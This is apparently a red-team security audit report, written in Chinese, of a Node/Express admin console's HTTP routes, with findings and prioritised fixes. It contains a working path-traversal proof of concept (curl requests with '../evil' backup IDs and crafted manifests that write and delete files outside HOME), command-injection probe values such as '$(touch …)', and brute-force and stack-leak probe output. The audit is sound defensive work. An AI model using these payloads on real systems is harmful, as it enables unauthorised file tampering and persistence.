# 控制台 HTTP 安全面审计（红队 A / task-53）

审计者：rtk-auditor · 时点 2026-10-01T06:53–07:05Z（本地 14:53–15:05）
范围：`server/index.ts` 全部 59 条路由、`server/auth.ts`、`server/db.ts`、错误与日志路径、会话、上传/路径类端点
方法：代码取证 + **临时实例**（`mktemp` 的 HOME/DATA_DIR、端口 8850、`NODE_ENV` 未设置以复现真实启动环境）+ 生产实例上的**只读探测与 1 次畸形 JSON 登录请求**（非写操作）
约束遵守：不改产品代码；写范围仅 `docs/qa/red-team/**`；生产未做写操作、未爆破；爆破/遍历全部打在临时实例；真实 agent 配置未触碰

---

## 0. 结论摘要

| # | 面 | 结论 | 级别 |
| --- | --- | --- | --- |
| 1 | 鉴权覆盖矩阵 | 59 条路由中 57 条未认证即 401；唯二 200 的是 `/api/session`（只回 `{authenticated:false}`）与 `/api/logout`（只清 cookie）。**未发现漏挂鉴权的敏感路由**，但守卫是「`/api` 前缀挂载」这一结构性弱点（见 1.3） | 信息级 |
| 2 | **路径穿越（rollback）** | **`POST /api/rtk/rollback` 可越界读目录 + 任意文件写/删**：`backupId` 未校验 → 逃出备份根；manifest 里的 `rel` 未校验 → 逃出 HOME。已实测在 HOME 之外写入任意内容、并删除任意文件 | **高** |
| 3 | 错误处理/堆栈泄密 | 畸形 JSON / 超大 body → Express 默认错误页，**未认证**即可拿到**带绝对路径的完整堆栈**；**生产实例已复现**。根因：启动环境未设 `NODE_ENV`。服务日志同样落绝对路径 | 中 |
| 4 | 登录爆破 | **无限流/无锁定/无延迟**：35 次失败后正确密码仍 200。错误信息对「用户名不存在」「密码错误」完全一致（无枚举）；时序差实测不可区分（0.395 vs 0.380ms，n=30） | 中（暴露公网时） |
| 5 | 会话与 Cookie | HttpOnly ✓ SameSite=Strict ✓ Max-Age 12h ✓；**生产 Cookie 无 `Secure`**（启动脚本 `COOKIE_SECURE: 'false'`）；**登出不做服务端吊销**（旧 token 重放仍 200，最长再活 12h）；换 `SESSION_SECRET` 重启后旧会话 401 ✓；伪造/篡改签名 401 ✓ | 中低 |
| 6 | 越权 / IDOR | **无多租户越权面**：单管理员模型（1 组凭据 + 无 users/roles 表），所有 `/api` 写操作等价于管理员 | 未发现 |
| 7 | 注入面 | SQL 全参数化（模板拼接只用于内部 helper，不含用户输入）；`addAudit` 参数化；凭据名 `encodeURIComponent` 进上游 URL；`agent`/`plane` 经注册表白名单校验，命令注入实测 0 命中 | 未发现 |
| 8 | CSRF | 服务端**无 Origin/Referer 校验、无 CSRF token**，仅依赖 `SameSite=Strict` + HttpOnly + 全部写操作都是 POST/PATCH/DELETE（实测 GET 无实质副作用，仅 `/api/cpa/oauth/status` 成功时写一条审计）。默认部署（同源 SPA）下够用；建议补 Origin 校验作纵深防御 | 低 |
| 9 | 上传 / 文件名 | 上传文件名与压缩包条目名都过 `path.basename()`；`getLocalAuthFile(name)` 有 `path.join(dir,name)` 未校验，但其调用方 `magpieManagementRequest` **无任何 HTTP 调用点** → 当前不可达（潜在项） | 信息级 |

**一句话**：控制台的鉴权面（1）和注入面（7）做得干净；真正的问题是 **rollback 的路径穿越（高）** 和 **未设 `NODE_ENV` 导致的堆栈/路径泄漏（中）**。

---

## 1. 鉴权覆盖矩阵

### 1.1 结构

- 唯一鉴权中间件：`server/index.ts:250` `app.use('/api', requireAuth)`（`requireAuth` 见 `server/auth.ts:49-52`，校验 HMAC 签名 + 过期）。
- 5 条**注册在中间件之前**的路由（`server/index.ts:140/141/150/166/213/236`）：`GET /api/session`、`POST /api/login`、`POST /api/logout`、`GET /v1/usage`、`GET /v1/usage/requests`、`GET /api/public/model-catalog`（后三条自带 API Key 校验，`publicUsageKey()` 按 `key_value` 精确查库、只看自己的用量）。
- 非 `/api` 前缀路由 3 条：`GET /v1/usage`、`GET /v1/usage/requests`（API Key 面）、`GET /docs`（公开文档页）。

### 1.2 未认证探测（脚本 `evidence/security/probe-auth-matrix.mjs`，逐路由实发请求）

```
$ node probe-auth-matrix.mjs 8850
authMiddleWare line: 250  routes: 59
状态码分布: {"401": 57, "200": 2}
未返回 401 的路由：
  {"line":140,"method":"GET","path":"/api/session","beforeAuthMw":true,"status":200,"snippet":"{\"authenticated\":false}"}
  {"line":150,"method":"POST","path":"/api/logout","beforeAuthMw":true,"status":200,"snippet":"{\"ok\":true}"}
```
完整逐路由输出见 `evidence/security/01-auth-matrix.txt`。

要点：`/api/rtk/*`（status/planes/toggle/rollback/install/upgrade）、`/api/ab/preference`、`/api/credentials/*`、`/api/keys/*`、`/api/audit`、`/api/version` **全部**在未登录时 401；`/api/public/model-catalog` 与 `/v1/usage*` 走 API Key 面（无 Key → 401）。

### 1.3 全量路由 × 鉴权矩阵（59 条，逐条实发未认证请求）

| # | 方法 | 路径 | 行号 | 在鉴权中间件之前 | 未认证探测 | 判定 |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | GET | `/api/session` | 140 | 是 | 200 | **公开**（只回 `{authenticated:false}`，无敏感数据） |
| 2 | POST | `/api/login` | 141 | 是 | 401 | **公开**（登录端点，自身校验凭据，失败 401） |
| 3 | POST | `/api/logout` | 150 | 是 | 200 | **公开**（只清 cookie） |
| 4 | GET | `/v1/usage` | 166 | 是 | 401 | **公开但需网关 API Key**（无 Key → 401，只回本 Key 自己的数据） |
| 5 | GET | `/v1/usage/requests` | 213 | 是 | 401 | **公开但需网关 API Key**（无 Key → 401，只回本 Key 自己的数据） |
| 6 | GET | `/api/public/model-catalog` | 236 | 是 | 401 | **公开但需网关 API Key**（无 Key → 401，只回本 Key 自己的数据） |
| 7 | POST | `/api/credentials/upload` | 252 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 8 | PATCH | `/api/keys/:id/quota` | 363 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 9 | POST | `/api/keys/:id/quota/reset` | 386 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 10 | GET | `/api/bootstrap` | 408 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 11 | POST | `/api/keys/:id/reveal-token` | 464 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 12 | GET | `/api/keys/:id/reveal` | 470 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 13 | POST | `/api/keys` | 501 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 14 | PATCH | `/api/keys/:id` | 524 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 15 | DELETE | `/api/keys/:id` | 551 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 16 | GET | `/api/usage-overview` | 563 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 17 | GET | `/api/usage-page` | 573 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 18 | GET | `/api/usage-key-summaries` | 583 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 19 | GET | `/api/dashboard` | 593 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 20 | GET | `/api/analytics` | 632 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 21 | GET | `/api/charts` | 642 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 22 | GET | `/api/charts-latency` | 652 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 23 | GET | `/api/monitor` | 662 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 24 | POST | `/api/accounts/:authIndex/reset-codex-quota` | 725 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 25 | POST | `/api/accounts/:authIndex/reset-claude-quota` | 760 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 26 | GET | `/api/channels` | 803 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 27 | POST | `/api/channels/discover` | 815 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 28 | POST | `/api/channels` | 823 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 29 | PATCH | `/api/channels/:name` | 840 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 30 | DELETE | `/api/channels/:name` | 851 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 31 | PATCH | `/api/channels/:name/models/:model` | 861 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 32 | POST | `/api/channels/prune-stale` | 872 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 33 | GET | `/api/usage-breakdown` | 882 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 34 | GET | `/api/cache-analytics` | 898 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 35 | GET | `/api/cache-trend` | 945 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 36 | GET | `/api/cache-live` | 962 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 37 | GET | `/api/cache-live/status` | 1000 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 38 | GET | `/api/data-plane/status` | 1008 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 39 | GET | `/api/model-index` | 1013 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 40 | PATCH | `/api/model-index/:model/sources/:channel` | 1020 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 41 | PATCH | `/api/credentials/:name` | 1031 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 42 | DELETE | `/api/credentials/:name` | 1042 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 43 | GET | `/api/credentials/:name/proxy` | 1052 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 44 | PATCH | `/api/credentials/:name/proxy` | 1060 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 45 | GET | `/api/version` | 1076 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 46 | POST | `/api/cpa/oauth/start` | 1088 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 47 | GET | `/api/cpa/oauth/status` | 1099 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 48 | POST | `/api/cpa/oauth/callback` | 1114 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 49 | POST | `/api/cpa/credentials/api-key` | 1129 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 50 | POST | `/api/cpa/oauth/cancel` | 1143 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 51 | POST | `/api/models/sync` | 1155 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 52 | GET | `/api/rtk/status` | 1167 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 53 | GET | `/api/rtk/planes` | 1181 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 54 | POST | `/api/rtk/toggle` | 1191 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 55 | POST | `/api/rtk/rollback` | 1214 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 56 | POST | `/api/rtk/install` | 1247 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 57 | POST | `/api/rtk/upgrade` | 1252 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 58 | POST | `/api/ab/preference` | 1257 | 否 | 401 | 受 `requireAuth` 保护 ✓ |
| 59 | GET | `/api/audit` | 1261 | 否 | 401 | 受 `requireAuth` 保护 ✓ |

> 说明：「未认证探测」列是**实测 HTTP 状态码**（脚本 `probe-auth-matrix.mjs`）；`/docs`、静态资源与 SPA 回退不在这张表里（它们不是 `app.get/post/...` 注册的路由），见 1.4。

### 1.4 公开面（非 `/api`）实测：**没有文件泄露**

```
/docs  -> 200 (dist/docs.html，公开文档，设计如此)
/      -> 200 (SPA)
/.env           -> 200，内容 = index.html（SPA 回退）
/server/index.ts -> 200，内容 = index.html
/package.json    -> 200，内容 = index.html
/src/main.ts     -> 200，内容 = index.html
```
`express.static(dist)` 只暴露 `dist/`；其余路径落到 SPA 回退 `res.sendFile(dist/index.html)`（`server/index.ts:1300-1303`），因此「200」是回退而不是文件读取。`dist/` 里也没有 `.map`/`sourceMappingURL`，敏感串扫描（`sk-ant`/`BEGIN PRIVATE`/`MGMT_SECRET`/`LEAKCANARY` 等）0 命中。

**结构性风险（非当前漏洞）**：鉴权是「路径前缀挂载」——任何**将来**新增的、不以 `/api` 开头的路由都会**默认公开**。建议改成「全局 auth 中间件 + 显式公开白名单」，并加一条断言测试（遍历路由表，凡未在白名单且不在 `/api` 下的直接失败）。

---

## 2. 路径穿越：`POST /api/rtk/rollback`（**高**）

### 2.1 代码事实

- `server/rtkService.ts:773` 定义了 `BACKUP_ID_PATTERN`，但**只在 `listRtkBackups` 里用于 `recognized` 标记**，rollback 路径从不使用它。
- `restoreRtkBackup(home, backupId)`：`path.join(root, backupId)` —— `backupId` 直接来自 `req.body.backup`（`server/index.ts:1216`）。
- 随后逐条读 manifest：`path.join(home, file.rel)` —— `rel` 也**没有任何校验**；`existed:false` 时执行 `fs.rmSync(target)`。

### 2.2 实测（临时实例 8850，`RTK_BACKUP_DIR=/tmp/cac-sec-*/backups`）

**任意文件删除**（备份根之外的目录 + 我构造的 manifest）：
```
$ curl -b ck3.txt -X POST /api/rtk/rollback -d '{"backup":"../../etc","confirm":true}'
{"error":"备份 ../../etc 不存在","plane":"local","reason":"backup_not_found"}   [404]   ← 对照组

$ mkdir -p /tmp/cac-sec-*/evil && echo '{"files":[{"rel":"pwned-canary.txt","existed":false}]}' > .../evil/manifest.json
$ echo target-hit > /tmp/cac-sec-*/home/pwned-canary.txt
$ curl -b ck3.txt -X POST /api/rtk/rollback -d '{"backup":"../evil","confirm":true}'
HTTP 200，restored=["pwned-canary.txt"]
删除后 /tmp/cac-sec-*/home/pwned-canary.txt: absent     ← 越界删除成功
```

**任意文件写入**（manifest 里的 `rel` 逃出 HOME）：
```
.../evil2/manifest.json = {"files":[{"rel":"../../cac-sec-write-canary.txt","existed":true}]}
.../evil2/..__..__cac-sec-write-canary.txt = "ARBITRARY-WRITE-PROOF"   （备份侧文件名把 / 换成 __）
$ curl -b ck3.txt -X POST /api/rtk/rollback -d '{"backup":"../evil2","confirm":true}'
HTTP 200 {"backupId":"../evil2","restored":["../../cac-sec-write-canary.txt"]}
写入结果 /tmp/cac-sec-write-canary.txt = ARBITRARY-WRITE-PROOF   ← HOME 之外落盘成功
```
审计**有留痕但事后**：`rollback_rtk_hook target=../evil2 details=outcome=ok, restored=../../cac-sec-write-canary.txt`。

### 2.3 级别与利用前提

- **级别：高**（以服务账号身份任意写/删文件 → 可写 `~/Library/LaunchAgents/*.plist`、`~/.zshrc`、`~/.ssh/authorized_keys` 等实现持久化/提权）。
- **前提**：① 一个已登录会话（端点本身在 `requireAuth` 之后）；② 磁盘上存在一个攻击者可写、控制台可读的目录且能放 `manifest.json` + 与 `rel` 同名的副本文件。**`/tmp` 天然满足 ②**，因此**本机任意低权用户**都能布置；管理员（或被窃取会话的攻击者）一旦触发 rollback，就以控制台账号身份执行任意写/删 → **本地提权链**。
- **修法**：`backupId` 必须匹配 `BACKUP_ID_PATTERN`（已有常量）；manifest 每条 `rel` 必须 `path.resolve(home, rel)` 后仍在 `home` 内（或直接限定在 agent 配置白名单文件集）；`existed:false` 的删除同样受该约束。

---

## 3. 错误处理与堆栈/路径泄漏（**中**）

```
$ curl -s -X POST http://127.0.0.1:8850/api/login -H 'Content-Type: application/json' -d '{bad json'
<!DOCTYPE html><html lang="en">...<pre>SyntaxError: Expected property name or '}' in JSON at position 1 ...
    at JSON.parse (<anonymous>)
    at parse (<repo>/node_modules/body-parser/lib/types/json.js:91:21)
    at <repo>/node_modules/body-parser/lib/read.js:162:18
    ...对照：超大 body → PayloadTooLargeError: request entity too large + 同样堆栈

$ curl -s -X POST http://127.0.0.1:8791/api/login ... -d '{bad'      # 生产实例，1 次，非写操作
同一形态：SyntaxError + 绝对路径堆栈
```

- **未认证可达**：`express.json()` 在鉴权中间件**之前**执行（`server/index.ts:137`），所以任何人带一个畸形 JSON 就能触发。
- **根因**：没有自定义错误中间件，落到 Express 默认错误处理器；而启动环境**未设置 `NODE_ENV`**（`grep -rn NODE_ENV scripts/*.mjs server/*.ts` 为空；`scripts/magpie-console.mjs:103-111` 的 env 白名单里也没有），Express 因此按 development 模式回显堆栈。生产 launchd 服务同样如此。
- 影响：泄露部署绝对路径、依赖与目录结构（有助于针对性攻击）；日志侧同样落盘（`grep -o '<repo>[^ ]*' console.log` 命中 body-parser/raw-body 路径）。
- **修法**：启动 env 加 `NODE_ENV=production`；并加统一错误中间件（JSON + 仅 `code/reason`，堆栈只进服务日志）。
- 好消息：**没有**密钥类泄漏 —— 我用 canary 值（`LEAKCANARY-CPA-KEY-9f3a` / `LEAKCANARY-SRC-KEY-7b1c`）设置了 `CPA_MANAGEMENT_KEY` 与 `MAGPIE_SOURCE_CPA_KEY`，畸形请求、登录失败、上游不可达 (`{"error":"fetch failed"}`) 三类响应与日志中命中数均为 **0**；`SESSION_SECRET`/管理员密码在响应与日志中 0 命中。

---

## 4. 会话与 Cookie

生产实例登录响应头（1 次登录）：
```
Set-Cookie: crosery_console_session=<expires>.<hmac>; Max-Age=43200; Path=/; HttpOnly; SameSite=Strict
```
| 项 | 结论 |
| --- | --- |
| HttpOnly | ✓ 有 |
| SameSite | ✓ `Strict`（跨站不带 cookie，是当前 CSRF 的主要防线） |
| Secure | ✗ **生产没有**（`scripts/magpie-console.mjs:105` 显式 `COOKIE_SECURE: 'false'`）；若将来经中转站以 HTTPS 暴露，应改 `true` 并配 HSTS/强制 HTTPS |
| 过期 | 12h（`server/auth.ts:6` `MAX_AGE`），过期即 401 ✓ |
| 伪造/篡改 | 伪造远期过期 + 原签名 → 401；改一位签名 → 401 ✓（HMAC + `timingSafeEqual`） |
| 会话固定 | 无固定面：token 在登录成功时才签发，攻击者无法预置有效签名 ✓ |
| 登出 | `clearCookie` 只清客户端；**服务端无会话存储 → 旧 token 重放仍 200**（实测），最长再活 12h。建议：加会话版本号/短 TTL，或允许"登出全部会话" |
| 重启 | `SESSION_SECRET` 每次启动 `randomBytes(32)` 新生成（`scripts/magpie-console.mjs:106`）→ 实测换 secret 重启后旧 cookie **401** ✓。运维含义：**每次重启/重建都会踢掉所有已登录会话**（自行决定是否接受；若不可接受，应把 secret 持久化到凭据库） |
| 并发登录 | 无限制、互不失效（无状态 token） |

---

## 5. 登录爆破 / 限流 / 枚举（**中**，暴露公网时）

```
$ node brute.mjs 8850            # 10 次错误密码 + 10 次不存在用户名 + 15 次失败
错误密码    median 0.93ms  [401]
不存在用户名 median 0.43ms  [401]
响应体是否一致: true  "{\"error\":\"管理员账号或密码不正确\"}"
20+ 次失败后正确密码登录: 200 {"ok":true}        ← 没有任何限流/锁定/延迟
$ node timing.mjs 8850           # 30 样本 + 预热
{"correctUsername":{"median":0.395},"unknownUsername":{"median":0.380},"ratioMedian":1.04}
```

- **无限流、无锁定、无退避**：35 次失败后仍可继续且正确密码立即成功。前提：控制台可达（默认 `HOST=127.0.0.1`，只有运维把它挂到公网/中转站时才可利用）。
- **无用户名枚举**：错误文案完全一致 ✓。`validateCredentials` 用 `&&` 短路，理论上「用户名不匹配则跳过密码比较」构成时序侧信道，但 30 样本实测差异 4%（噪声级）→ **信息级**，不构成可利用漏洞。
- 建议：`/api/login` 加按 IP 的失败计数 + 指数退避（即使单管理员也应做）；或至少加固定 200–300ms 延迟。

---

## 6. 越权 / IDOR：**无多租户越权面**（未发现）

- **单管理员确认**：凭据只有一组，来自 `CONSOLE_USERNAME`（默认 `admin`）+ `CONSOLE_PASSWORD`（`server/config.ts:100-101`，生产经 Keychain 注入）；`server/db.ts` 的建表清单里**没有** users/roles/tenants 表（只有 `api_keys`/`usage_events`/`quota_usage_events`/`audit_log`/`channel_states`/`channel_model_states`/`app_settings`）。`api_keys` 是给网关调用方用的推理 Key，不是控制台账号。
- 因此：所有 `/api` 下按 `:id`/`:name` 操作的端点，其"归属校验"等价于"是否已登录"；不存在「A 用户操作 B 用户对象」的面。IDOR 判据不适用 → **未发现越权漏洞**（这是结论，不是漏审）。
- 仍然值得记的**健壮性**问题：`/api/keys/:id/reveal` 等按 id 的端点未找到对象时返回 410/404 的语义清晰，没有把"存在但无权"与"不存在"区分开（单管理员下无影响）。

---

## 7. 注入面：未发现

- **SQL**：`grep 'db.prepare(\`'` 出的模板字符串查询（`server/index.ts:218`、`server/sync.ts` 等）插值的是内部 helper（`canonicalModelSql()`、`active.sql`/`active.params`），用户输入一律走 `?` 占位；`addAudit` 也是 `?`（`server/db.ts:330-333`）。`ALTER TABLE ... ADD COLUMN ${name} ${definition}`（`server/db.ts:130/154`）的 name/definition 来自代码内常量表，非用户输入。
- **命令**：`agent`/`plane` 参数先过注册表白名单再进 `spawn` 参数数组（无 shell）；实测 `agent="codex; touch /tmp/…"`、`agent="$(touch …)"`、`plane="kernel; …"` 全部被 404/400 拒绝，`/tmp/cac-sec-pwned*` 产物 0 个。
- **上游 URL**：凭据名一律 `encodeURIComponent`（`server/cpa.ts:220/253/269`），PATCH 走 JSON body；`/api/credentials/..%2f..%2fetc%2fpasswd/proxy` → 上游不可达时 502 `fetch failed`，无路径效果。
- **反射**：错误信息会回显用户输入（`未知 agent: codex; touch …`）——前端按文本渲染（Vue 默认转义），未发现 `v-html` 注入点；保持现状即可。

---

## 8. CSRF

- 服务端**没有** Origin/Referer 校验，也**没有** CSRF token（`grep -rn "origin\|referer" server/index.ts server/auth.ts` 为空）。
- 实际防线：`SameSite=Strict` + `HttpOnly` + 全部状态变更为 POST/PATCH/DELETE（实测 GET 路由无实质副作用；唯一例外 `GET /api/cpa/oauth/status` 在成功时写一条 `oauth_login_success` 审计，信息级）。
- `/api/ab/preference`：handler 自带 `isAuthenticated()` 内联校验（`server/abLab.ts:199-202`），并且它也在 `requireAuth` 之后 → 双保险；lead 提到的「同源例外」在 **客户端** `src/ab/readOnlyGate.ts:80-142`（A/B 实验台的只读闸门，按 origin + 方法白名单拦截写请求），是实验台自我保护，不是服务端鉴权旁路，**不能也不应该当作安全控制**。
- 判定：默认部署（同源 SPA + Strict）下 CSRF 风险低；若将来把控制台嵌到别的 origin 或加子域，Strict 仍保护 cookie 不被跨站携带。建议补一条 Origin 校验作为纵深防御（成本极低）。

---

## 9. 上传 / 文件路径

- 上传入口（`server/index.ts:252` 起）与 `server/multipartUpload.ts`/`server/credentialUpload.ts`：文件名与压缩包条目名都过 `path.basename()`（`credentialUpload.ts:150/160`），`prepareCredentialUpload` 只把名字当键用，不落盘到用户可控路径 ✓。
- `server/magpieControl.ts:231` `getLocalAuthFile(name)` 用 `path.join(dir, name)` **未校验** `../`，但唯一调用方 `magpieManagementRequest` 在本仓库**没有任何 HTTP 调用点**（`grep -rn 'magpieManagementRequest(' server/*.ts` 排除定义后为空）→ **当前不可达**；作为潜在项记录：将来若把它接到路由上，必须先校验 name。
- 已实测的路径类端点里，唯一真正可利用的就是第 2 节的 rollback。

---

## 10. 未验证 / 不该验证的清单

1. **生产爆破与限流**：按要求只在临时实例做（35 次失败），未对生产 `/api/login` 做任何爆破。
2. **生产写操作**：全部未做。生产侧只发了 2 类请求：① 1 次畸形 JSON 登录（证明堆栈泄漏，不改变状态）、② 若干只读 GET 与 1 次正常登录（读 cookie 属性）。畸形请求会写一行 Express 错误日志，这是唯一的生产侧副作用。
3. **中转站/公网暴露面**：控制台默认 `HOST=127.0.0.1`（`scripts/magpie-console.mjs:105`），实际是否经 nginx 暴露、是否 HTTPS-only、是否有 HTTP→HTTPS 跳转，仓库里只有 `deploy/nginx/ai-crsery-location-snippet.conf` 片段，**未能取证生产 nginx 配置** → 第 4 节「Secure 缺失」的实际风险取决于这一点，标为未验证。
4. **浏览器侧 SameSite 实际生效**：本轮未做浏览器跨站实验（只核对响应头与规范）。若 lead 需要，可用 ego-browser 从一个异源页面发跨站 POST 验证 cookie 不被携带。
5. **`api_keys` 表里已存在的 Key 明文存储**：`api_keys.key_value` 存明文（`/v1/usage` 按 `key_value` 精确匹配可佐证），这是产品设计（需支持 reveal/复制）；未评估其与"网关侧 Key 哈希"的分工，列为待确认项而非缺陷。

---

## 11. 处置建议（按优先级）

| 优先级 | 事项 | 位置 |
| --- | --- | --- |
| **P0** | rollback 路径穿越：`backupId` 过 `BACKUP_ID_PATTERN`；manifest 的 `rel` 必须 `resolve` 后仍在 `home` 内（写与删都要） | `server/rtkService.ts` `restoreRtkBackup()` |
| **P1** | `NODE_ENV=production` + 统一 JSON 错误中间件（堆栈只进日志） | `scripts/magpie-console.mjs` env / `server/index.ts` 末尾 |
| **P1** | 登录限流：按 IP 失败计数 + 指数退避（或固定延迟） | `server/index.ts:141` |
| **P2** | 会话吊销：登出后旧 token 应失效（会话版本号 / 短 TTL / 主动失效列表）；暴露 HTTPS 时置 `COOKIE_SECURE=true` | `server/auth.ts`、`scripts/magpie-console.mjs:105` |
| **P2** | 鉴权改为全局中间件 + 显式公开白名单，并加"新路由必须显式声明公开"的断言测试 | `server/index.ts:250` |
| **P3** | 纵深防御：写操作补 Origin 校验；`getLocalAuthFile` 的 name 校验（即使当前不可达）；`GET /api/cpa/oauth/status` 的审计写入移到 POST | 多处 |

---

## 12. 证据索引

| 文件 | 内容 |
| --- | --- |
| `evidence/security/01-auth-matrix.txt` + `probe-auth-matrix.mjs` | 59 条路由的未认证探测结果（含每条的 beforeAuthMw 标志与状态码） |
| `evidence/security/02-stack-trace-leak.txt` | 畸形 JSON / 超大 body 的堆栈与绝对路径（临时实例 + 生产实例） |
| `evidence/security/03-session-cookie.txt` | 生产 Set-Cookie 属性、伪造/篡改/重放实测 |
| `evidence/security/04-traversal-rollback.txt` | 路径穿越的完整复现（越界删除 + 越界写入 + 代码事实） |
| `evidence/security/05-bruteforce-timing.txt` | 35 次失败无限流 + 30 样本时序测量 |
| `evidence/security/06-injection-probes.txt` | 命令注入与 SQL 注入探测结果 |
